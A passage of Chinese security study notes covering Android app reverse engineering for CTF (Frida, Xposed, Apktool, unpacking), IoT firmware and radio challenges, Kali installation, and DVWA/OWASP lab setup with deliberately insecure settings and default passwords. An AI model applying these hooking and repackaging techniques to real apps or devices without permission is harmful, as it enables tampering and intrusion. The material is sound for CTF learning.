R3，其余在栈里。</li><li><strong>出栈入栈指令</strong>：push和pop指令与Intel x86类似，push后可接多个寄存器。</li><li><strong>保存/恢复寄存器指令</strong>：LDR、STR、LDM、STM系列指令用于寄存器与内存的数据交互，LDM、STM可用于出栈入栈操作。</li></ul><h3 id="（四）adb工具"><a href="#（四）adb工具" class="headerlink" title="（四）adb工具"></a>（四）adb工具</h3><p>adb是谷歌官方命令行工具，用于连接真机或模拟器（需打开USB调试），主要功能如下：</p><ul><li><strong>设备管理</strong>：<code>adb devices</code>查看连接设备；<code>adb install &lt;APK路径&gt;</code>安装APK；<code>adb uninstall &lt;package&gt;</code>卸载APP。</li><li><strong>shell与日志</strong>：<code>adb shell</code>打开shell；<code>adb logcat</code>查看日志。</li><li><strong>文件传输</strong>：<code>adb push &lt;本地文件&gt; &lt;远程路径&gt;</code>上传文件；<code>adb pull &lt;远程文件&gt; &lt;本地路径&gt;</code>下载文件。</li><li><strong>端口转发</strong>：<code>adb forward [--no-rebind] LOCAL REMOTE</code>和<code>adb reverse [--no-rebind] REMOTE LOCAL</code>进行端口转发，<code>adb forward –list</code>和<code>adb reverse --list</code>列出转发端口。</li><li><strong>其他操作</strong>：如<code>adb kill-server</code>终止ADB Server；<code>adb start-server</code>启动；<code>adb root</code>以root权限重启ADB DAEMON；<code>adb reboot</code>重启设备等。</li></ul><h3 id="（五）APK文件格式"><a href="#（五）APK文件格式" class="headerlink" title="（五）APK文件格式"></a>（五）APK文件格式</h3><p>APK是zip压缩文件，解压后包含：</p><ul><li><strong>AndroidManifest.xml</strong>：APK属性文件，描述Activity、所需函数、启动类等信息，需用工具解析。</li><li><strong>META-INF</strong>：编译自动生成，尽量不手动修改。</li><li><strong>assets</strong>：其中文件原封不动打包，常存放密钥或密文等。</li><li><strong>classes.dex</strong>：存放Dalvik字节码，解析方法后续介绍。</li><li><strong>libs</strong>：包含Native层所需lib库。</li><li><strong>res</strong>：存放资源文件。</li><li><strong>resources.arsc</strong>：存放资源关联信息，解析后可查看。</li></ul><h2 id="二、Dalvik层逆向分析"><a href="#二、Dalvik层逆向分析" class="headerlink" title="二、Dalvik层逆向分析"></a>二、Dalvik层逆向分析</h2><h3 id="（一）Dalvik基础知识"><a href="#（一）Dalvik基础知识" class="headerlink" title="（一）Dalvik基础知识"></a>（一）Dalvik基础知识</h3><ul><li><strong>寄存器</strong>：基于寄存器架构，有v和p两种命名法。p命名法中p0、p1等表示传入参数，v命名法中v0、v1等表示局部变量和参数，函数开头用<code>.locals</code>和<code>.param</code>描述变量。</li><li><strong>类型</strong>：有11种变量类型，32位用一个寄存器存储，64位用两个。L类型表示类，[类型表示数组，可组合使用。</li><li><strong>方法</strong>：以<code>.method</code>开始，<code>.end method</code>结束，用<code>#</code>注释方法类型，通过方法名、参数类型和返回值描述方法，<code>-&gt;</code>表示方法调用关系。</li><li><strong>指令特点</strong>：与Intel x86汇编指令相似，参数从目标到源。是变长指令，通过后缀表示寄存器编号范围和常量取值范围，还有<code>-</code>后缀表示类型。常见指令有返回指令（如<code>return-void</code>等）、方法调用指令（如<code>invoke-kind</code>系列）、跳转指令（如<code>goto</code>、<code>if-test</code>系列）。</li></ul><h3 id="（二）静态分析工具与方法"><a href="#（二）静态分析工具与方法" class="headerlink" title="（二）静态分析工具与方法"></a>（二）静态分析工具与方法</h3><ul><li><strong>Apktool</strong>：优秀的APK反编译工具，可将APK解压并转换DEX为BakSmali代码，转换<code>resources.arsc</code>为XML。支持重新打包和签名，是破解常用工具。跨平台，需Java 1.7以上。可编译或下载运行，建议自己编译以便处理混淆。常用命令：<code>apktool d [ecode][options] &lt;file_apk&gt;</code>反编译；<code>apktool b [uild][options] &lt;app_path&gt;</code>编译。反编译后查看<code>AndroidManifest.xml</code>获取关键信息，修改BakSmali代码后需签名才能安装运行，签名可按步骤生成密钥并使用<code>signapk.jar</code>工具。</li><li><strong>dex2jar</strong>：将DEX文件转换为Jar文件，开源，可克隆源码编译。常用<code>d2j-dex2jar.sh filename</code>命令生成Jar文件，还包含其他实用工具。</li><li><strong>jd-gui</strong>：开源工具，用于查看Jar文件反编译的Java代码，可克隆源码编译运行，将Jar文件拖入即可查看。</li><li><strong>FernFlower</strong>：JetBrains公司开发，反编译效果好，开源可编译使用。命令为<code>java -jar fernflower.jar jar_path out_dir</code>，输出目录需手动创建，反编译后解压可获得Java文件。与jd - gui相比，jd - gui有图形界面但反编译效果稍欠，FernFlower命令行操作且能一次性反编译所有类，可结合使用。</li><li><strong>Android Killer/jadx/APK Studio</strong><ul><li><strong>Android Killer</strong>：可视化工具，集成多种功能，操作方便，但闭源且只支持Windows。可自动反编译APK，编辑BakSmali代码，重打包和签名，还包含多种小工具。若重打包失败可升级Apktool。</li><li><strong>jadx</strong>：开源，全平台可用，集成<code>dex2jar</code>和<code>jd-gui</code>功能，可一键反编译生成Java代码。源码克隆后编译运行<code>jadx-gui</code>程序，拖入APK文件即可查看代码。</li><li><strong>APK Studio</strong>：开源，跨平台，集成<code>Apktool</code>和<code>jarsigner</code>功能。编译较复杂，需安装Qt5编译环境，配置Apktool路径后可使用。重打包和签名功能可用，但签名可能失败，建议用Apktool签名方法。</li></ul></li><li><strong>JEB</strong>：闭源商业软件，支持反编译APK、DEX、Jar文件，有JEB1和JEB2版本，JEB2功能更完善。反编译结果非标准Java文件，但不影响理解，其交叉引用功能强大，可方便重命名和查看引用。使用时将APK拖入“工程浏览器”，可切换查看BakSmali和Java代码，右键点击代码有多种实用功能，如交叉引用、注释、进制转换等，还可预览<code>Manifest.xml</code>和资源文件。</li><li><strong>其他工具</strong>：Androguard是恶意软件分析工具包，包含多个小工具可分析APK；IDA Pro也支持DEX文件静态分析，拖入APK选择<code>class.dex</code>即可反编译。</li></ul><h3 id="（三）动态调试方法"><a href="#（三）动态调试方法" class="headerlink" title="（三）动态调试方法"></a>（三）动态调试方法</h3><ul><li><strong>log调试</strong>：通过修改BakSmali代码插入<code>android.util.Log</code>类的打印语句实现调试，但需重打包，不适用于有完整性校验等保护的APK。插入语句时要注意选择合适的局部变量存储<code>tag</code>参数，避免信息淹没或过度修改代码。</li><li><strong>smali动态调试</strong>：利用Dalvik虚拟机的JDWP调试支持，需满足<code>ro.debuggable</code>为1或APK的<code>AndroidManifest.xml</code>中<code>&lt;application&gt;</code>元素包含<code>android:debuggable=&quot;true&quot;</code>。可使用<code>setpropex</code>工具（需root权限）修改<code>ro.debuggable</code>属性。JEB2可进行动态调试，点击调试按钮选择目标手机和App进入调试模式，可设置断点、查看变量等，与一般调试方法类似。</li><li><strong>Xposed框架</strong>：基于Hook技术，通过修改<code>app_process</code>程序加载<code>XposedBridge.jar</code>文件来Hook APK。安装需先安装对应模块管理器，根据系统版本不同有所区别。安装<code>app_process</code>有直接修改和刷机包替换两种方法，后者较烦琐。开发Xposed模块需在Android studio或Intellij IDEA中创建工程，添加依赖和<code>meta-data</code>属性，实现<code>IXposedHookLoadPackage</code>接口的<code>handleLoadPackage</code>方法，使用<code>findAndHookMethod</code>进行Hook操作，最后在<code>xposed_init</code>文件声明Hook类名并安装运行模块。</li><li><strong>Frida框架</strong>：全平台支持，上层抽象为JavaScript API调用。Android系统中需在手机端运行<code>frida-server</code>（需Root权限），与客户端通过adb端口转发通信。客户端可使用Python或JavaScript实现，Python客户端安装<code>frida</code>库后编写代码，JavaScript客户端需安装<code>nodejs</code>和<code>npm</code>环境并按步骤配置。服务端先下载<code>frida-server</code>并推送到手机运行，然后编写Hook代码，使用<code>Java.perform</code>注册，<code>Java.use</code>选取要Hook的类，修改<code>implementation</code>属性实现Hook，可通过<code>send</code>或<code>console.log</code>打印信息，处理重载函数需使用<code>overload</code>函数。</li></ul><h3 id="（四）Dalvik层混淆及加固技术"><a href="#（四）Dalvik层混淆及加固技术" class="headerlink" title="（四）Dalvik层混淆及加固技术"></a>（四）Dalvik层混淆及加固技术</h3><ul><li><strong>ProGuard混淆</strong>：Android SDK默认混淆器，混淆类名、方法名、变量名等标识符，但部分重要接口类和方法不混淆。解题时可从关键接口方法入手，用JEB的交叉引用和重命名功能辅助分析。</li><li><strong>DEX破坏</strong>：针对Apktool反编译，修改<code>classes.dex</code>部分字段使反编译失败。可根据报错信息回溯或对比正常APK文件解决，同时要更新Apktool版本。</li><li><strong>APK伪加密</strong>：修改APK文件加密字段为1，使解压工具提示密码错误，但不影响在Android系统运行。可将相关字节设为0或用Android Killer去除伪加密。</li><li><strong>APK增加数据</strong>：在APK末尾添加数据破坏解压缩流程，解决方法是剔除多余数据并注意其中提示信息。</li><li><strong>DEX隐藏</strong>：将真正DEX文件隐藏，执行时由解壳程序解密加载。解题关键是找到<code>DexClassLoader</code>加载和保存文件的位置。</li></ul><h2 id="三、Native层逆向"><a href="#三、Native层逆向" class="headerlink" title="三、Native层逆向"></a>三、Native层逆向</h2><h3 id="（一）Native层介绍"><a href="#（一）Native层介绍" class="headerlink" title="（一）Native层介绍"></a>（一）Native层介绍</h3><ul><li><strong>正向开发</strong>：使用Android NDK可让Java层调用C/C++代码。开发步骤为：在Java文件中用<code>native</code>声明Native方法；运行<code>javah</code>生成<code>.h</code>头文件，包含JNI调用所需变量和函数声明；编写函数实现并创建<code>Android.mk</code>和<code>Application.mk</code>文件配置编译参数；用<code>ndk-build</code>编译生成<code>lib</code>库文件；在Java类中用<code>System.loadLibrary</code>加载库文件。形成JNI调用需满足有<code>System.loadLibrary</code>加载、Java类中有<code>native</code>声明方法、Native层有带<code>JNIEXPORT</code>参数的对应函数三个条件，其中前两个必要，最后一个因Native函数可动态注册并非绝对。</li><li><strong>JNI调用特征分析</strong>：以Android 7.0.0_r1源码为例，<code>System.loadLibrary</code>方法会调用<code>Runtime.loadLibrary0</code>，后者根据<code>ClassLoader</code>类型查找<code>lib</code>文件路径并传入<code>doLoad</code>方法，<code>doLoad</code>再调用Native层的<code>nativeLoad</code>函数，最终调用<code>JavaVMExt::LoadNativeLibrary</code>加载<code>lib</code>库。加载过程中关键是<code>dlopen</code>函数调用（会搜索<code>init_array</code>段并运行）和<code>JNI_OnLoad</code>函数调用（若存在则自动运行），解题时需重点关注这两个入口和<code>(*env)-&gt;RegisterNatives</code>函数。</li></ul><h3 id="（二）使用IDA-Pro静态分析"><a href="#（二）使用IDA-Pro静态分析" class="headerlink" title="（二）使用IDA Pro静态分析"></a>（二）使用IDA Pro静态分析</h3><p>将APK解压后的<code>so</code>文件拖入IDA Pro，查看导出表找感兴趣函数（如<code>JNI_OnLoad</code>），双击函数可反编译为C语言形式，若参数识别错误需手动修改函数定义。还要查看<code>init_array</code>段，可能隐藏关键代码，通过<code>Segments</code>窗口找到并双击进入查看。</p><h3 id="（三）动态调试方法-1"><a href="#（三）动态调试方法-1" class="headerlink" title="（三）动态调试方法"></a>（三）动态调试方法</h3><ul><li><strong>IDA Pro调试</strong>：需ROOT手机。将<code>android_server</code>文件推送到手机<code>/data/local/tmp</code>目录并启动，设置端口转发，在IDA Pro中选择远程调试并连接手机端口，选择调试进程后即可开始调试，调试时可结合静态分析窗口辅助。</li><li><strong>GDB调试</strong>：通常使用<code>gdbserver</code>进行远程调试。先从AOSP下载<code>gdbserver</code>和对应系统版本的GDB，将<code>gdbserver</code>推送到手机运行（选择合适模式和监听端口），设置端口转发，在电脑上运行GDB并连接远程调试器。调试时要结合IDA Pro静态分析，常用命令有查看内存（<code>x/FMT ADDRESS</code>）、查看数据（<code>print/FMT EXP</code>）、设置断点（<code>break [LOCATION] [thread THREADNUM] [if CONDITION]</code>）、调试代码（如<code>next</code>、<code>step</code>等）、修改变量（<code>set</code>命令）、查看栈信息（<code>bt</code>、<code>up</code>、<code>down</code>、<code>frame</code>等命令）。</li><li><strong>Frida框架</strong>：在Native层使用<code>Module.findExportByName</code>找到目标函数地址，用<code>Interceptor.attach</code>注册Hook函数，<code>onEnter</code>回调处理传入参数，<code>onLeave</code>回调处理返回值。若函数未导出可手动构造<code>NativePointer</code>对象，结合<code>Module.findBaseAddress</code>和偏移量定位函数地址。还可使用<code>hexdump</code>方法打印内存。</li></ul><h3 id="（四）OLLVM混淆及加固技术"><a href="#（四）OLLVM混淆及加固技术" class="headerlink" title="（四）OLLVM混淆及加固技术"></a>（四）OLLVM混淆及加固技术</h3><p>OLLVM基于LLVM编译器，支持多种语言和架构，有三种混淆方式：</p><ul><li><strong>-fla（控制流扁平化）</strong>：将代码划分为基础块放入无限循环，用新变量和<code>switch</code>语句控制流程。分析时可根据寄存器LR赋值情况还原代码。</li><li><strong>-bcf（虚假控制流）</strong>：复制基础块代码并添加永真虚假分支。可通过源码中跳转条件（如<code>y&lt;10||x*(x+1)%2==0</code>）识别并去除无尽循环分支来绕过。</li><li><strong>-sub（指令替代）</strong>：将常见基础指令替换为复杂指令，程序主要流程不变，可查看官方文档处理。</li></ul><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>本篇从Android基础知识、Dalvik层逆向、Native层逆向三个方面介绍了CTF中Android题目的类型和解法，涵盖架构、工具、调试、混淆加固等内容，为Android逆向提供了全面的知识和技能指导。</p><h1 id="IoT笔记"><a href="#IoT笔记" class="headerlink" title="IoT笔记"></a>IoT笔记</h1><h2 id="一、IoT与嵌入式系统基础"><a href="#一、IoT与嵌入式系统基础" class="headerlink" title="一、IoT与嵌入式系统基础"></a>一、IoT与嵌入式系统基础</h2><h3 id="（一）IoT-概述"><a href="#（一）IoT-概述" class="headerlink" title="（一）IoT 概述"></a>（一）IoT 概述</h3><ul><li><strong>定义与本质</strong>：IoT 安全基于嵌入式系统的传感器网络，涵盖车联网、传感器网络、工控网络等，核心由传感器、RFID、嵌入式系统技术组成，是低功耗、协议简化的无线通信网络，与传统互联网在设备、网络结构、数据传输等方面存在差异。</li><li><strong>关键技术作用</strong><ul><li><strong>传感器技术</strong>：将模拟信号转换为数字信号，使计算机能处理物理世界信息，是计算机应用的关键。</li><li><strong>RFID 技术</strong>：融合无线射频与嵌入式技术，在自动识别等领域应用广泛。</li><li><strong>嵌入式系统技术</strong>：综合多技术，其智能终端产品无处不在，微控制器和 DSP 是重要组成部分。</li></ul></li></ul><h3 id="（二）嵌入式系统"><a href="#（二）嵌入式系统" class="headerlink" title="（二）嵌入式系统"></a>（二）嵌入式系统</h3><ul><li><strong>定义与实例</strong>：具有完整计算能力的单板或片上系统，常见于手机、摄像头等电子产品，在航天军事领域也有大量应用。</li><li><strong>基本概念</strong><ul><li><strong>信号类型</strong>：模拟信号连续，是物理世界电信号；数字信号离散，通过采样模拟信号获得，便于计算机存储处理。</li><li><strong>硬件相关</strong>：单片机（MCU）集成多种组件；固件是单片机固化程序；不同架构有各自指令集；DSP 用于浮点运算加速；嵌入式处理器满足特定应用需求；基带涉及信号处理；Datasheet 是芯片关键文档；FPGA 可硬件编程用于电路验证；频谱用于信号分析；无线传感器网络是分布式传感网络。</li></ul></li></ul><h2 id="二、CTF-中-IoT-题型分析"><a href="#二、CTF-中-IoT-题型分析" class="headerlink" title="二、CTF 中 IoT 题型分析"></a>二、CTF 中 IoT 题型分析</h2><h3 id="（一）逆向工程"><a href="#（一）逆向工程" class="headerlink" title="（一）逆向工程"></a>（一）逆向工程</h3><ul><li>涉及单片机或嵌入式处理器固件等逆向，因架构繁多且指令系统差异大，对初学者难度较高。</li></ul><h3 id="（二）漏洞利用（PWN）"><a href="#（二）漏洞利用（PWN）" class="headerlink" title="（二）漏洞利用（PWN）"></a>（二）漏洞利用（PWN）</h3><ul><li>Linux 等系统在嵌入式环境应用使部分漏洞利用方法可迁移，但受架构和设备能力限制，多集中在 ARM - Linux 和 MIPS - Linux 平台，解题需掌握通用 PWN 技巧。</li></ul><h3 id="（三）取证（forensic）"><a href="#（三）取证（forensic）" class="headerlink" title="（三）取证（forensic）"></a>（三）取证（forensic）</h3><ul><li>通常提供固件分析提取信息，熟悉固件结构是解题关键。</li></ul><h3 id="（四）协议分析（MISC）"><a href="#（四）协议分析（MISC）" class="headerlink" title="（四）协议分析（MISC）"></a>（四）协议分析（MISC）</h3><ul><li>分析无线传感器网络数据包格式，通过 diff 推测字节含义确定协议，难点在于校验位算法复杂。</li></ul><h3 id="（五）无线信号分析"><a href="#（五）无线信号分析" class="headerlink" title="（五）无线信号分析"></a>（五）无线信号分析</h3><ul><li>根据无线通信波形分析内容，涵盖简单调制方式解调及复杂 4G 信号分析，对专业知识要求高。</li></ul><h2 id="三、IoT-固件逆向工程技巧"><a href="#三、IoT-固件逆向工程技巧" class="headerlink" title="三、IoT 固件逆向工程技巧"></a>三、IoT 固件逆向工程技巧</h2><h3 id="（一）常见-IoT-架构"><a href="#（一）常见-IoT-架构" class="headerlink" title="（一）常见 IoT 架构"></a>（一）常见 IoT 架构</h3><ul><li><strong>ARM</strong>：应用广泛，Cortex 系列包括 A（高性能应用处理器）、M（高性能低功耗微控制器）、R（实时操作系统专用）等子架构，各有特点和应用场景，ARMv8 为 64 位架构。</li><li><strong>MIPS</strong>：采用无内部互锁流水线设计，在网络设备中有优势，CTF 题目涉及 PWN 和逆向，无 NX 保护。</li><li><strong>8051</strong>：Intel 设计的 8 位复杂指令集 MCU，稳定性强，在工控网络常用，未来可能在 CTF 中出现。</li><li><strong>AVR</strong>：Atmel 研发的 8 位精简指令集高速单片机，打破传统设计格局，在多领域应用，CTF 有相关逆向题。</li><li><strong>PowerPC</strong>：曾抗衡 x86 架构，现主要用于嵌入式和小型机市场，PWN 题因大端序较难利用，以固件分析和逆向为主。</li><li><strong>其他架构</strong>：如 PIC32、MSP430、IA64 等，各有特点和应用场景。</li></ul><h3 id="（二）芯片手册运用"><a href="#（二）芯片手册运用" class="headerlink" title="（二）芯片手册运用"></a>（二）芯片手册运用</h3><ul><li><strong>获取与阅读方法</strong>：可通过 Google 或厂商官网获取 Datasheet，推荐 alldatasheet 网站。阅读时关注引脚定义、内存映射图和寄存器信息，以 STM32F103 为例介绍了具体分析方法。</li></ul><h3 id="（三）IDA-操作技巧"><a href="#（三）IDA-操作技巧" class="headerlink" title="（三）IDA 操作技巧"></a>（三）IDA 操作技巧</h3><ul><li><strong>寻找固件入口点</strong>：以 STM32F103 程序为例，在 IDA 中加载 hex 文件时选对 CPU，找到中断向量表中最小指针确定入口点，必要时手动转换数据为指令。</li><li><strong>地址处理</strong>：添加对应 segment 将操作数转 Offset，可进一步修改地址名字，便于分析特殊功能寄存器和 SRAM 地址。</li><li><strong>CPU 高级选项</strong>：精确设置 CPU 架构可提升 IDA 分析效果，如选择 ARMv7 - M 可准确分析 Cortex M 架构代码。</li></ul><h3 id="（四）调试环境与工具"><a href="#（四）调试环境与工具" class="headerlink" title="（四）调试环境与工具"></a>（四）调试环境与工具</h3><ul><li><strong>Linux 类环境</strong>：ARM - Linux、MIPS - Linux 等可使用基于 Debian 的环境，Qemu 提供多架构虚拟化，介绍了其镜像下载和启动方法，不同架构参数有差异。</li><li><strong>裸机环境</strong>：针对无操作系统的程序，可使用特定实验室的编译环境或 Docker，以 ARM 环境为例说明了工具使用方法。</li><li><strong>专业调试工具</strong><ul><li><strong>MDK</strong>：Keil 公司开发的微控制器开发工具，支持多种 CPU 内核，介绍了工程创建、调试文件添加和设置方法，可进行反汇编调试和外设寄存器查看等操作。</li><li><strong>AVR Studio</strong>：Atmel 公司为 AVR 单片机开发的集成环境，可免费使用，介绍了其工程创建和调试方法，注意 AVR 单片机存储结构特点。</li><li><strong>Hapsim</strong>：AVR 外设模拟器，作为 AVR Studio 插件使用，可模拟多种接口与程序交互，介绍了其使用步骤和设置方法。</li></ul></li><li><strong>反编译工具</strong>：IDA 部分版本对 IoT 程序反编译支持有限，Retargetable Decomplier 是可替代工具，支持多平台，提供在线反编译和插件功能。</li></ul><h2 id="四、固件结构分析方法"><a href="#四、固件结构分析方法" class="headerlink" title="四、固件结构分析方法"></a>四、固件结构分析方法</h2><h3 id="（一）常见固件类型"><a href="#（一）常见固件类型" class="headerlink" title="（一）常见固件类型"></a>（一）常见固件类型</h3><ul><li>包括裸机程序、文件系统镜像、带压缩的镜像和文件系统等，重点介绍文件系统分析，可使用 binwalk、file 等命令初步识别固件类型。</li></ul><h3 id="（二）Flash-文件系统"><a href="#（二）Flash-文件系统" class="headerlink" title="（二）Flash 文件系统"></a>（二）Flash 文件系统</h3><ul><li>JFFS/JFFS2 适用于 NOR Flash，支持多种压缩算法；YAFFS/YAFFS2 针对 NAND Flash，大容量读写有优势；Squashfs 是 Linux 只读压缩文件系统，用于存储紧张场合。</li></ul><h3 id="（三）固件基地址确定"><a href="#（三）固件基地址确定" class="headerlink" title="（三）固件基地址确定"></a>（三）固件基地址确定</h3><ul><li><strong>方法</strong>：裸机程序可查 Datasheet；部分固件可在分区表查找；PowerPC 可利用汇编特性确定，其他架构需经验和额外信息辅助。</li><li><strong>示例</strong>：以 Confused ARM 和某 3G 路由固件为例说明了具体确定方法。</li></ul><h3 id="（四）固件分析工具"><a href="#（四）固件分析工具" class="headerlink" title="（四）固件分析工具"></a>（四）固件分析工具</h3><ul><li><strong>Firmware Mod Kit</strong>：用于编辑 Squashfs 固件，可提取分析相关路由器固件，介绍了其下载和提取脚本使用方法。</li><li><strong>mtd - utils</strong>：用于挂载 jffs/jffs2 和 yaffs/yaffs2 固件，以 jffs2 为例介绍了安装、识别、加载和挂载步骤。</li></ul><h2 id="五、无线信号分析要点"><a href="#五、无线信号分析要点" class="headerlink" title="五、无线信号分析要点"></a>五、无线信号分析要点</h2><h3 id="（一）基本理论"><a href="#（一）基本理论" class="headerlink" title="（一）基本理论"></a>（一）基本理论</h3><ul><li>介绍射频信号、频谱、绝对带宽和有效带宽等概念，频谱是理解无线通信的关键。</li></ul><h3 id="（二）调制解调方式"><a href="#（二）调制解调方式" class="headerlink" title="（二）调制解调方式"></a>（二）调制解调方式</h3><ul><li><strong>曼彻斯特编码</strong>：同步时钟编码技术，兼具时钟和数据传输，有自同步和抗干扰能力，编码规则明确但存在歧义。</li><li><strong>ASK</strong>：用信号振幅有无表示 0 和 1，介绍了通用解调方法及滤波器设计要点。</li><li><strong>FSK</strong>：用不同频率表示 0 和 1，通过过零点次数区分频率，解调需经滤波器处理和包络判断。</li></ul><h3 id="（三）Matlab-应用"><a href="#（三）Matlab-应用" class="headerlink" title="（三）Matlab 应用"></a>（三）Matlab 应用</h3><ul><li>以 ASK 为例介绍 Matlab 的 sptool 在信号处理和滤波器设计中的应用，包括信号导入、滤波器设计和应用及结果导出等步骤。</li></ul><h2 id="六、经典赛题解析"><a href="#六、经典赛题解析" class="headerlink" title="六、经典赛题解析"></a>六、经典赛题解析</h2><h3 id="（一）PCTF2016：Confused-ARM"><a href="#（一）PCTF2016：Confused-ARM" class="headerlink" title="（一）PCTF2016：Confused ARM"></a>（一）PCTF2016：Confused ARM</h3><ul><li>分析 main 函数确定相关函数功能，通过动态调试发现 AES 算法使用痕迹，找出算法错误并 patch，修改 hex 文件后重新加载获取 flag。</li></ul><h3 id="（二）UCTF2016-资格赛：TWI"><a href="#（二）UCTF2016-资格赛：TWI" class="headerlink" title="（二）UCTF2016 资格赛：TWI"></a>（二）UCTF2016 资格赛：TWI</h3><ul><li>用 file 命令识别为 Atmel AVR 程序，结合 AVR Studio 和 IDA 调试分析，处理程序中的陷阱，确定关键代码逻辑并逆向求解 flag。</li></ul><h3 id="（三）UCTF2016-决赛：Normandie"><a href="#（三）UCTF2016-决赛：Normandie" class="headerlink" title="（三）UCTF2016 决赛：Normandie"></a>（三）UCTF2016 决赛：Normandie</h3><ul><li>识别固件后解压，分析信息确定操作系统和主机架构，用 IDA 加载并确定基地址和重建符号表，分析函数得到后门账号和密码相关信息，经爆破得到密码。</li></ul><h3 id="（四）ACTF2016：4G-Radio"><a href="#（四）ACTF2016：4G-Radio" class="headerlink" title="（四）ACTF2016：4G Radio"></a>（四）ACTF2016：4G Radio</h3><ul><li>用 Matlab 分析 wav 文件，经 ASK 调制解调、滤波、抽样和曼彻斯特解码得到二维码，扫描获取摄像头固件，挂载后找到管理员密码。</li></ul><h3 id="（五）UCTF2016-资格赛：传感器-1-2"><a href="#（五）UCTF2016-资格赛：传感器-1-2" class="headerlink" title="（五）UCTF2016 资格赛：传感器(1)(2)"></a>（五）UCTF2016 资格赛：传感器(1)(2)</h3><ul><li><strong>传感器（1）</strong>：对数据进行曼彻斯特解码，按规则转换得到 flag。</li><li><strong>传感器（2）</strong>：与传感器 1 解码思路相同，重点考察数据包 diff 方法，分析不同部分含义计算相关值。</li></ul><h3 id="（六）UCTF2016-资格赛：Add"><a href="#（六）UCTF2016-资格赛：Add" class="headerlink" title="（六）UCTF2016 资格赛：Add"></a>（六）UCTF2016 资格赛：Add</h3><ul><li>识别为 mipsel 可执行程序，搭建调试环境，利用栈溢出漏洞和反编译代码确定攻击方法，编写 exp 脚本获取 shell。</li></ul><h1 id="Kali系统"><a href="#Kali系统" class="headerlink" title="Kali系统"></a>Kali系统</h1><h2 id="（一）简介"><a href="#（一）简介" class="headerlink" title="（一）简介"></a>（一）简介</h2><ol><li><strong>Parrot 渗透测试系统</strong>：集成渗透测试、信息查找、数字取证等多功能环境，自带 Tor 和 Firefox 浏览器方便暗网访问与活动隐藏，支持 Wine 可运行 Windows 应用。</li><li><strong>BlackArch Linux</strong>：基于 Arch Linux，拥有超 2600 个涵盖多领域（数字取证、漏洞挖掘利用等）的工具，专为安全人员设计。</li><li><strong>Kali Linux</strong>：基于 Debian 的开源系统，集成 600 多款工具用于渗透测试等安全活动，具有完全定制化 ISO 镜像、多设备平台支持、多种启动与安全功能（如 Live USB 启动、隐蔽模式、LUKS nuke）、多语言支持及无线设备扫描利用能力等优势，在功能、易用性和市场占有率上领先。</li></ol><h2 id="（二）Kali-Linux-安装"><a href="#（二）Kali-Linux-安装" class="headerlink" title="（二）Kali Linux 安装"></a>（二）Kali Linux 安装</h2><ol><li><strong>下载</strong>：访问官网，点击 DOWNLOAD 后选 Bare Metal 标签，再点 Installer 下载镜像文件；也有 Weekly（最新未测镜像）、NetInstaller（安装时下载软件包）版本及虚拟机文件（默认用户密码 kali）。</li><li><strong>安装到虚拟机（以 VMware Workstation 16 为例）</strong><ul><li>新建虚拟机：选“典型”，稍后安装操作系统，选 Linux 类型，设置名称位置（非 C 盘），磁盘 40GB（常用）或 20GB（偶尔用），完成后编辑虚拟机设置，内存设 2GB（不超宿主机 3/4 且不超 8GB），处理器依宿主机配置设为 1 个处理器、2 个内核，选桥接模式，指定下载的镜像文件。</li><li>安装过程：开启虚拟机，选 Graphical install，依次设置中文（简体）语言、中国区域、汉语键盘，自动获取 IP 与配置主机名（设为 kali），按需设域名，设用户名 snowwolf 和密码 123qwe，磁盘分区选整个磁盘安装（物理机建议手动分区），选推荐分区方案，确认后下载安装软件包、安装 GRUB 到主引导记录（选 /dev/sda），完成安装后重启登录。</li></ul></li><li><strong>更新</strong>：采用滚动更新，用 APT 工具。先在终端用 Vim 编辑 /etc/apt/sources.list 文件（默认官方源），再依次执行 sudo apt update、sudo apt full-upgrade -y、sudo apt-get dist-upgrade 命令更新软件源、软件包和系统，最后重启。</li><li><strong>配置</strong><ul><li><strong>自适应窗口</strong>：点击屏幕左上角“查看”菜单，选“立即适应客户机”。</li><li><strong>切换 root 用户</strong>：一是点击 Kali Linux Logo 运行 Root Terminal Emulator 终端程序，输入 snowwolf 用户密码授权进入 root 权限终端；二是终端输入 sudo reboot 重启，在重启界面按 E 键修改启动参数为 rw quiet splash init=/bin/bash 进入单用户模式，用 passwd root 命令修改 root 密码后重启登录。</li><li><strong>浏览器配置</strong>：点击 Kali Linux Logo 打开 Firefox 浏览器，在偏好设置中选 Language 选项添加中文语言重启；以 HackBar 插件为例，在扩展和主题中搜索添加，使用时按 F12 键调出。</li></ul></li></ol><h2 id="（三）靶机"><a href="#（三）靶机" class="headerlink" title="（三）靶机"></a>（三）靶机</h2><ol><li><strong>DVWA 靶机</strong><ul><li><strong>下载</strong>：在 Kali Linux 终端执行 git clone <a target="_blank" rel="noopener" href="https://github.com/digininja/DVWA/var/www/html/DVWA">https://github.com/digininja/DVWA/var/www/html/DVWA</a> 命令下载到网页目录。</li><li><strong>配置</strong>：终端输入 chmod 777 -R DVWA/ 赋予权限，启动 apache2 和 mysql 服务，登录 mysql（Kali Linux 中为 MariaDB）创建 dvwa 数据库并授权远程访问，在 DVWA 目录下复制 config.inc.php.dist 为 config.inc.php 并修改其中数据库相关配置（db_server、db_database、db_user、db_password），重启 apache 服务。</li><li><strong>验证</strong>：在 Firefox 浏览器地址栏输入 <a target="_blank" rel="noopener" href="http://127.0.0.1/DVWA/setup.php">http://127.0.0.1/DVWA/setup.php</a> 进行安装检查，按需修改 php.ini 文件中 allow_url_fopen 和 allow_url_include 选项为 On 后重启 apache，点击 Create/Reset Database 导入数据库文件，用默认用户名 admin 和密码 password 登录进入主界面。</li></ul></li><li><strong>OWASP 靶机</strong>：访问 <a target="_blank" rel="noopener" href="https://sourceforge.net/projects/owaspbwa/files/">https://sourceforge.net/projects/owaspbwa/files/</a> 下载解压，修改虚拟机运行内存为 512MB，网络适配器设为与 Kali Linux 一致（如桥接模式），启动后用默认用户名 root 和密码 owaspbwa 登录系统，在浏览器输入靶机地址（如 <a target="_blank" rel="noopener" href="http://192.168.8.109）进入">http://192.168.8.109）进入</a> Web 界面，登录其他靶机环境可能需用用户名 admin 和密码 admin 尝试。</li></ol><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="（一）概念"><a href="#（一）概念" class="headerlink" title="（一）概念"></a>（一）概念</h2><p>信息收集是渗透测试关键基础，通过对目标系统全面调查分析获取特征、漏洞等信息，为攻击定策略。遵循保持隐蔽性、灵活性、完整性、准确性原则，需测试人员具创造力与分析力。开源情报是重要信息源。</p><h2 